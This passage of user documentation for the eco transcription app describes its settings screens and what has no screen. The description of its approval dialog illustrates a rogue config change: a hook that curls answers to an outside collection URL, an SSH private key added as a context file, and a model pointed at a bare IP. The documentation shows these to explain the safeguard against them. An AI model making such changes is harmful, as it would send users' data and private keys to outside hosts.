A row per source: its name, its PipeWire devices and whether it is you. REFRESH
DEVICES reads the devices again. The last row, YOUR MICROPHONE, opens the two
switches that keep your microphone apart from the others, DROP ECHOES and ECHO
CANCELLATION, each beside what it does; it is never deleted. Deleting a source
says who is no longer heard. A source, read, has its name and whether it is
you under ABOUT, HEARD NOW with a live trace for each of its devices while it
is captured (under `--replay` the daemon captures nothing, so the pictures have
none), and DEVICES, a table of its devices with their kind and colour. Edited,
it has only its NAME and THIS IS ME; a new source gets its devices on its read
screen once it is saved. ADD DEVICE opens a table of every device the source
does not have, with its kind and the source it is heard as now:

![The ADD DEVICE screen inside the audio source "Them": THEM over the title ADD DEVICE; the bar with BACK and ADD DEVICE; "The devices this audio source is not heard through. A device has one owner: one another audio source has is taken from it."; a table NAME · KIND · HEARD AS with Default microphone (MIC, Me, picked), H390 headset microphone (MIC, —), H390 headset (OUT, —) and Built-in microphone (MIC, —).](img/40-settings-audio-source.png)

A device has one owner: adding one another source has moves it here. With a
device picked, COLOUR opens its own screen, the colour picker and SAVE, and
REMOVE stops hearing the source through it; REMOVE asks first when the source
is left with no device, or when it was the last output any source had.

**Models** — every model, registered once:

![Settings, 02 MODELS: the bar with ADD MODEL, VIEW and a dimmed DELETE; "Register each model once — chat or transcription — with its provider…"; a table NAME · TYPE · MODEL ID · USED BY: whisper-lan (TRANSCRIPTION · whisper-large-v3-turbo · DEFAULT TRANSCRIPTION, MEETING, CONVERSATION…, picked), deepgram (TRANSCRIPTION · nova-3 · INTERVIEW), gemini-flash (CHAT · google/gemini-2.5-flash · ASSISTANT, TRANSLATION, MEETING, MEETING TRA…), claude-haiku (CHAT · anthropic/claude-haiku-4.5 · minutes).](img/41-settings-models.png)

The assistant's model and the default transcription cannot be deleted, so
DELETE is dimmed on them; deleting another says what falls back to which model.
Opened, a model shows its facts, and under RELATED everything that uses it:

![The model gemini-flash, read: the bar with BACK, EDIT and a dimmed DELETE; ABOUT with TYPE CHAT, PROVIDER OPENROUTER, BASE URL https://openrouter.ai/api/v1, MODEL ID google/gemini-2.5-flash, KEY FROM env OPENROUTER_API_KEY, REASONING OFF; RELATED with ANSWERS › ASSISTANT, TRANSLATION › TRANSLATION, and SESSIONS · ASSISTANT + TRANSLATION › MEETING, CONVERSATION, OTHER, IDEA, INTERVIEW.](img/42-settings-model.png)

Edited, it has its type while nothing uses it, its name, the reasoning for a
chat model, the provider (CUSTOM takes any base URL), the model (LIST shows the
models the provider offers), where the key comes from (an environment variable
or an omapass password), the price per minute of a transcription model and,
for a chat model, EXTRA (JSON), the extra fields sent with each request. Without omapass on the machine, as in these pictures,
**OMAPASS** is off and an info button beside it opens omapass's install page.
On Windows **CREDENTIAL MANAGER** stands in its place: a field for the key's
name and, once one is typed, how to store that key with `eco key set <name>` or
as the generic credential `eco:<name>`. The pictures are made on Linux, so none
shows it:

![The model gemini-flash being edited, EDITING beside MODEL, the bar with a dimmed SAVE and CANCEL: NAME "gemini-flash"; REASONING with PROVIDER'S, OFF (lit), LOW, MEDIUM, HIGH; PROVIDER with OPENROUTER (lit), GROQ, CUSTOM; MODEL "google/gemini-2.5-flash" with LIST; KEY FROM with ENV (lit), a dimmed OMAPASS and an info button, and "OPENROUTER_API_KEY"; EXTRA (JSON) holding "{}".](img/43-settings-model-edit.png)

Renaming a model renames it wherever it is used.

**Transcription** — the default transcriber and the spoken languages:

![Settings, 03, the TRANSCRIPTION item, read: the bar with EDIT and, on the right, ADD LANGUAGE; ABOUT with DEFAULT MODEL whisper-lan and DEFAULT SPOKEN LANGUAGE EN · American English; RELATED with MODELS › whisper-lan; "Transcribes sessions whose kind picks no transcription model"; and OFFERED SPOKEN LANGUAGES, a table LANGUAGE · DEFAULT with AUTO · detect, EN · American English (DEFAULT), ES · español de España and PT · português.](img/44-settings-transcription.png)

EDIT holds only the default model. The languages a session may start in are
the table OFFERED SPOKEN LANGUAGES, in the order the dropdowns show them. ADD
LANGUAGE lists the languages eco knows that are not offered yet, AUTO among
them; ADD LANGUAGE or `Enter` on the one picked offers it. With a language
picked, MAKE DEFAULT makes new sessions start in it, MOVE UP and MOVE DOWN
change its place, and REMOVE stops offering it; removing the default asks first
and names the language that becomes the default. The last language cannot be
removed.

**Answers** — the assistant, its reviewer, and what they are told:

![Settings, 04 ANSWERS: the bar with ADD CONTEXT SLOT and VIEW; a table NAME · MODEL · ABOUT: assistant (gemini-flash · 60000 characters · 8 answers, all sessions, picked), reviewer (claude-haiku · off), global context (1 file · always sent), resume (1 file · on in INTERVIEW).](img/45-settings-answers.png)

The assistant answers questions, and the skills and session kinds that pick no
model; the reviewer, when on, rewrites every answer with its own model before
you see it; the global context is the files sent with every answer; each
context slot is files a session of the kinds it names starts with on. Only the
slots are added and deleted; deleting one says which kinds lose it. The global
context and each slot, opened, show their files as the table FILES, in the
order they are sent. ADD FILE opens a screen with a PATH field: ADD FILE, or
`Enter`, adds the path typed, and BROWSE adds at once every file chosen in the
file dialog. With a file picked, MOVE UP and MOVE DOWN change its place and
REMOVE takes it off; each saves at once. The global context has no EDIT, so ADD
FILE is its main action; a slot's EDIT holds only its name and the kinds it is
on from the start in, and a new slot gets its files once it is saved. Opened,
the assistant:

![The assistant, read: the bar with BACK and EDIT; ABOUT with DEFAULT MODEL gemini-flash, CONTEXT LIMIT 60000 characters, AT THE SAME TIME 8 answers, all sessions; under it "Answers questions, and skills and session kinds that pick no model" and RULES FOR EVERY ANSWER, four lines of rules; RELATED with MODELS › gemini-flash, SKILLS › reply, explain, and SESSIONS › MEETING, CONVERSATION, OTHER, IDEA, INTERVIEW.](img/46-settings-assistant.png)

**Skills** — what the composer's chips do:

![Settings, 05 SKILLS: the bar with ADD SKILL, VIEW, a dimmed MOVE UP, MOVE DOWN and DELETE; a table NAME · MODEL · HOOK: reply (default · gemini-flash · HOOK · ON SEND, picked), minutes (claude-haiku), explain (default · gemini-flash).](img/47-settings-skills.png)

The order here is the order of the chips and of `Alt+1…9`; MOVE UP and MOVE
DOWN change it and save at once. A skill with no model of its own names the one
it inherits:

![The skill reply, read: the bar with BACK, EDIT and DELETE; ABOUT with MODEL default · gemini-flash, HOOK ~/bin/post-to-notes, SEND ON ITS OWN off; PROMPT and OUTPUT FORMAT in full below; RELATED with MODELS › gemini-flash.](img/48-settings-skill.png)

Edited, it has the name, the prompt, the format, the model and its hook:

![The skill reply being edited, EDITING beside SKILL, the bar with a dimmed SAVE and CANCEL: NAME "reply"; PROMPT and OUTPUT FORMAT as text areas; MODEL "default · gemini-flash"; HOOK "~/bin/post-to-notes" and what the command is run with; SEND ON ITS OWN, unlit.](img/49-settings-skill-edit.png)

A new name warns that global shortcuts call skills by name.

**Translation** — only the model:

![Settings, 06, the TRANSLATION item, read: the bar with EDIT only; ABOUT with DEFAULT MODEL gemini-flash; a sentence saying a session translates its lines and answers only once it is turned on in that session, on the TRANSLATION line of its details, and that here you pick the model; "Translates sessions whose kind picks no translation model; on the default, the assistant's model does"; RELATED with MODELS › gemini-flash.](img/50-settings-translation.png)

**Until a chat model is registered**, ANSWERS, SKILLS and TRANSLATION hold only
NO CHAT MODEL and "eco records and transcribes without one. Answers, skills and
translation need a chat model: register one under Models, then pick it here.",
and their bar holds only REGISTER A CHAT MODEL, which opens a new model under
Models. It is not pictured: the pictures run with chat models registered.

**Sessions** — the kinds, and what each runs on:

![Settings, 07 SESSIONS: the bar with ADD KIND, VIEW, a dimmed MAKE DEFAULT and DELETE; a sentence on the default kind and the kinds' own models; a table NAME · DEFAULT · TRANSCRIBES WITH · ANSWERS WITH: Meeting (DEFAULT · default · whisper-lan · default · gemini-flash, picked), Conversation, Other and Idea with the same defaults, interview (deepgram · default · gemini-flash).](img/51-settings-sessions.png)

The default kind is the one the start and import dialogs suggest; MAKE DEFAULT
makes the picked kind it. Deleting a kind says its sessions keep it and the
models and context slots chosen for it stop applying; the only kind left
cannot be deleted. Opened:

![The session kind Meeting, read: the bar with BACK, EDIT, a dimmed MAKE DEFAULT and DELETE; ABOUT with DEFAULT "Yes: suggested first when a session is created or imported", TRANSCRIPTION default · whisper-lan, ASSISTANT default · gemini-flash, TRANSLATION default · gemini-flash; RELATED with MODELS › whisper-lan, gemini-flash.](img/52-settings-kind.png)

Edited, a kind has its name and its own transcription, assistant and
translation models — only the transcription one until a chat model is
registered.

**Interface** — the interface language, whether eco hides from screen
sharing, and whether it shows in the tray:

![Settings, 08, the INTERFACE item, read: the bar with EDIT only; ABOUT with INTERFACE LANGUAGE English (US), HIDE FROM SCREEN SHARING off, SHOW ECO IN THE TRAY off, across the screen: nothing else in the settings uses it, so there is no RELATED.](img/53-settings-interface.png)

English, Brazilian Portuguese or Japanese, or `auto` to follow the system;
see [i18n.md](i18n.md). HIDE FROM SCREEN SHARING is off by default; on, it
applies to every eco window at once, and to each one that opens later.

SHOW ECO IN THE TRAY is off by default. Saved on, an icon shows in the
system tray at once — on Omarchy the bar's tray, on Windows the notification
area — and saved off, it goes; no restart. The icon is eco's bars in white,
with a red dot while a session records; its tooltip says `eco · idle` or
`eco · recording · <title>` (`<title>` is a placeholder for the session's
title). A click opens the eco window, or brings the open one forward, as `eco
window focus` does. Its menu has no picture here, as the tray is drawn by the
bar, not by eco; it holds **Open** (the same), **New session** (the start
dialog), **Settings** (opens or closes them, as `eco window config`) and
**Stop eco** (as `eco stop`: the windows and the icon go with the daemon). On
Omarchy the bar may keep tray icons in a drawer behind its `<` arrow.

**What keeps an item from saving** shows on its own field: an outline in the
error colour and the reason under it, and the keyboard goes to the first such
field. A value typed wrong shows as it is typed; a missing value once a save is
tried. Anything that is not one field's shows under the title. Here, ADD MODEL
and then SAVE with nothing filled:

![A new model being edited, NEW and EDITING beside MODEL, the bar with SAVE and CANCEL: TYPE with CHAT lit; NAME empty, showing "new model", outlined in red with "Give it a name." under it; REASONING, PROVIDER with OPENROUTER lit; MODEL empty, showing "e.g. google/gemini-3.5-flash-lite", outlined in red with "Set the provider's model id." under it; KEY FROM with ENV lit and "OPENROUTER_API_KEY".](img/54-settings-errors.png)

No model is required: before any is registered, the config saves with no
default transcription or assistant model, and sessions say none is chosen
until one is; a default that names a model names a registered one.

**Closing with an item unsaved** asks:

![The UNSAVED CHANGES dialog over the dimmed new model, a dot on the rail's 02 for the item not saved: "Your settings have unsaved changes. Save them before closing?" with SAVE AND CLOSE, KEEP EDITING and, filled red, DISCARD CHANGES.](img/55-settings-unsaved.png)

SAVE AND CLOSE saves the item and closes once it is saved; it stays open when
another item still has changes. Closing the eco window itself closes the
settings with it and does not ask: unsaved changes there are dropped.

**A change another program asked for.** Only this window's own SAVE writes at
once a new or changed skill hook, a new context file, or a new model or a
model's new address or key source. When another program on the socket sends a
config that does (an agent, a script), the daemon holds it and every eco window
asks, naming each hook command, each file path, and each model's address and
where its key comes from (never the key):

![The APPROVE THIS CHANGE dialog over a dimmed live session: "A program other than this window asked to change the settings. Approving saves it: a hook runs as a shell command after answers, a context file is sent to the model, and a model's key is sent to its address."; in red, "hook of minutes: curl -s --data-binary @- https://example.com/collect", "context file: ~/.ssh/id_ed25519" and "model fast: http://203.0.113.7/v1, key from $OPENROUTER_API_KEY"; REJECT and, filled red, APPROVE.](img/56-settings-pending.png)

**APPROVE** saves the change; **REJECT** drops it, and the status line says it
was rejected. Esc and a press outside do not close it. The keyboard starts on
REJECT. The daemon keeps one held change at a time; while the dialog is open,
no other program can change the settings, so what it lists does not change
under your pointer, and your choice applies only to the change it shows. This
window's own SAVE drops the held change. In these pictures the driver hands the window the daemon's
`config_pending` event (`docs/design.md §9`); nothing was sent to the socket.

# 13. What has no screen

Some things belong on this walk by their absence, so that somebody looking for
them finds out there is nothing to find.

**The audio.** There is no player and no waveform of a session, because there
is no audio to play: eco never writes raw audio to disk. A session is its
transcript, its answers and its notes. Outside a session the trace on the start
screen is a measurement and nothing else.

**Cost outside a session.** Not in the sessions list, not on an answer card,
not in a tooltip. It is the cost screen of section 8, opened from one
session's details. `eco sessions` prints it for agents.

**Assigning every line of a session to one person at once.** The window assigns
one speaker or one line; `eco assign <id> all` does the whole session.

**Linking older sessions to people in bulk.** `eco people adopt` links the
named live speakers of older sessions to people. The window has no button for
it.

**A transcript as a file.** COPY VTT puts the WebVTT on the clipboard;
`eco export <id> > session.vtt` writes it.

**The daemon itself.** Starting, stopping and restarting are `eco start`,
`eco stop` and `eco restart`; the window shows only whether it can reach the
daemon. Its errors go to `journalctl --user -u eco.service`.

**The global shortcuts.** The window lists them (section 11) but does not
change them: they are in `packaging/hypr/eco.lua`, or on Windows under
`[shortcuts]` in the config, and the skills they call by name are the
config's.

**Measurements.** `eco bench` and `mise run bench` print to the terminal; see
[benchmarks.md](benchmarks.md).

**Two sessions in one window.** A window shows one session. A session started
while another records takes the window; the other keeps recording under
SESSIONS › LIVE, and opening the app again opens a second window on it.
